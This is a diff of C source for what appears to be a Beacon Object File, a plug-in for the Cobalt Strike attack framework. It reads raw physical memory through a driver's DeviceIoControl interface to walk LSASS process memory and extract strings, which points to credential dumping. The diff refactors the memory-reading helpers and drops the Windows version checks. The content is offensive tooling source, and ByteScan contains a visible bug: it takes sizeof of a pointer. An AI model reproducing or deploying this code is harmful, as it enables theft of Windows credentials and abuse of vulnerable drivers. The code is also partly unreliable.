@@ -5,66 +5,20 @@
 #include "provider.h"
 #include "defs.h"
 
-
-char* GetWinBuildNumber()
-{
-    static char g_BuildStr[32];  // persists after return
-    DWORD cbData = sizeof(g_BuildStr);
-    g_BuildStr[0] = '\0';
-
-    LONG st = RegGetValueA(
-        HKEY_LOCAL_MACHINE,
-        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
-        "CurrentBuildNumber",
-        RRF_RT_REG_SZ,
-        NULL,
-        (PVOID)g_BuildStr,
-        &cbData
-    );
-
-    if (st != ERROR_SUCCESS) 
-    {
-        BeaconFormatPrintf(&outputbuffer, "Failed to get Windows build number (err=%ld)\n", st);
-        return NULL;
-    }
-
-    return g_BuildStr;
-}
-
-BOOL GetWinVersion(char* pvWindowsVersion, int size)
-{
-    LSTATUS status;
-    DWORD cbData = size;
-    status = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DisplayVersion", RRF_RT_REG_SZ, NULL, pvWindowsVersion, &cbData);
-    if (status == ERROR_FILE_NOT_FOUND)
-    {
-        cbData = size;
-        status = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId", RRF_RT_REG_SZ, NULL, pvWindowsVersion, &cbData);
-    }
-
-    if (status != ERROR_SUCCESS)
-    {
-        BeaconFormatPrintf(&outputbuffer, "Failed to get Windows version!\n");
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
-BOOL ReadByte(HANDLE hFile, ULONG_PTR PhysicalAddress, PBYTE ReadValue, int provId)
+BOOL ReadByte(HANDLE hFile, ULONG_PTR PhysicalAddress, PBYTE ReadValue)
 {
     typedef BOOL(NTAPI* fnDeviceIoControl)(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
     fnDeviceIoControl pDeviceIoControl = (fnDeviceIoControl)GetProcAddress(GetModuleHandleA("kernel32.dll"), "DeviceIoControl");
 
     if (!pDeviceIoControl) return FALSE;
 
-    PROVIDER_INFO* prov_info = GetProviderInfo(provId);
+    PROVIDER_INFO* prov_info = GetProviderInfo(provider);
     if (!prov_info) return FALSE;
 
     DWORD bytesReturned = 0;
     BOOL result = FALSE;
 
-    switch (provId)
+    switch (provider)
     {
         case PROVIDER_TPWSAV:
         {
@@ -134,7 +88,7 @@ BOOL ReadByte(HANDLE hFile, ULONG_PTR PhysicalAddress, PBYTE ReadValue, int prov
     return FALSE;
 }
 
-unsigned char* ReadMultipleBytes(HANDLE hFile, int NumberOfBytesToRead, DWORD64 PhysicalAddress, BOOL Forwards, int provId)
+unsigned char* ReadMultipleBytes(HANDLE hFile, int NumberOfBytesToRead, DWORD64 PhysicalAddress, BOOL Forwards)
 {
     unsigned char* ByteArray = (unsigned char*)malloc(NumberOfBytesToRead * sizeof(unsigned char));
     int j = 0;
@@ -143,7 +97,7 @@ unsigned char* ReadMultipleBytes(HANDLE hFile, int NumberOfBytesToRead, DWORD64 
     {
         for (DWORD64 i = PhysicalAddress; i < PhysicalAddress + NumberOfBytesToRead; i++)
         {
-            ReadByte(hFile, i, &ReadValue, provId);
+            ReadByte(hFile, i, &ReadValue);
             ByteArray[j] = ReadValue;
             j++;
         }
@@ -152,7 +106,7 @@ unsigned char* ReadMultipleBytes(HANDLE hFile, int NumberOfBytesToRead, DWORD64 
     {
         for (DWORD64 i = PhysicalAddress + NumberOfBytesToRead - 1; i >= PhysicalAddress; i--)
         {
-            ReadByte(hFile, i, &ReadValue, provId);
+            ReadByte(hFile, i, &ReadValue);
             ByteArray[j] = ReadValue;
             j++;
         }
@@ -161,7 +115,7 @@ unsigned char* ReadMultipleBytes(HANDLE hFile, int NumberOfBytesToRead, DWORD64 
     return ByteArray;
 }
 
-DWORD64 ByteScan(HANDLE hFile, unsigned char* TargetByteArray, int MaxNumberOfBytesToRead, DWORD64 PhysicalAddress, int provId)
+DWORD64 ByteScan(HANDLE hFile, unsigned char* TargetByteArray, int MaxNumberOfBytesToRead, DWORD64 PhysicalAddress)
 {
     int ArraySize = sizeof(TargetByteArray) - 1;
     int arrayCounter = 0;
@@ -172,7 +126,7 @@ DWORD64 ByteScan(HANDLE hFile, unsigned char* TargetByteArray, int MaxNumberOfBy
 
     for (DWORD64 i = PhysicalAddress; i < PhysicalAddress + MaxNumberOfBytesToRead; i++)
     {
-        ReadByte(hFile, i, &readByteValue, provId);
+        ReadByte(hFile, i, &readByteValue);
         InternalByteArray[arrayCounter] = readByteValue;
 
         if (arrayCounter == ArraySize - 1)
@@ -202,20 +156,20 @@ DWORD64 ByteScan(HANDLE hFile, unsigned char* TargetByteArray, int MaxNumberOfBy
 
 
 // Very similar to the ReadMultipleBytes function but we need it to go backwards to read address correctly
-DWORD64 ReadAddressAtPhysicalAddressLocation(HANDLE hFile, DWORD64 PhysicalAddress, int provId)
+DWORD64 ReadAddressAtPhysicalAddressLocation(HANDLE hFile, DWORD64 PhysicalAddress)
 {
     BYTE value = 0;
     DWORD64 address = 0;
     for (DWORD64 i = PhysicalAddress + 7; i >= PhysicalAddress; i--)
     {
-        ReadByte(hFile, i, &value, provId);
+        ReadByte(hFile, i, &value);
         address = (address << 8);
         address += value;
     }
     return address;
 }
 
-wchar_t* ReadUnicodeStringFromPhysical(HANDLE hFile, DWORD64 UnicodeStringStructPA, DWORD lower32bits, int LsassPID, int provId)
+wchar_t* ReadUnicodeStringFromPhysical(HANDLE hFile, DWORD64 UnicodeStringStructPA, DWORD lower32bits, int LsassPID)
 {
     /*
       typedef struct _UNICODE_STRING {
@@ -231,11 +185,11 @@ wchar_t* ReadUnicodeStringFromPhysical(HANDLE hFile, DWORD64 UnicodeStringStruct
 
     // Get length
     BYTE UnicodeStringLength = 0;
-    ReadByte(hFile, UnicodeStringStructPA + 0x2, &UnicodeStringLength, provId); // the 0x2 is to get the max length of the unicode string
+    ReadByte(hFile, UnicodeStringStructPA + 0x2, &UnicodeStringLength); // the 0x2 is to get the max length of the unicode string
 
     // Get address to the wide string
     DWORD64 UnicodeStringPA = 0;
-    DWORD64 pUnicodeStringVA = ReadAddressAtPhysicalAddressLocation(hFile, UnicodeStringStructPA + 0x8, provId);
+    DWORD64 pUnicodeStringVA = ReadAddressAtPhysicalAddressLocation(hFile, UnicodeStringStructPA + 0x8);
     TranslateUVA2Physical(pUnicodeStringVA, &UnicodeStringPA, lower32bits, LsassPID);
 
     // Read wide string & store string properly
@@ -245,8 +199,8 @@ wchar_t* ReadUnicodeStringFromPhysical(HANDLE hFile, DWORD64 UnicodeStringStruct
     BYTE ReadValueHigh = 0;
     for (DWORD64 i = UnicodeStringPA; i < UnicodeStringPA + UnicodeStringLength; i += 2)
     {
-        ReadByte(hFile, i, &ReadValueLow, provId);
-        ReadByte(hFile, i + 1, &ReadValueHigh, provId);
+        ReadByte(hFile, i, &ReadValueLow);
+        ReadByte(hFile, i + 1, &ReadValueHigh);
         UnicodeString[j] = (wchar_t)(ReadValueLow | ReadValueHigh << 8);
         j++;
     }
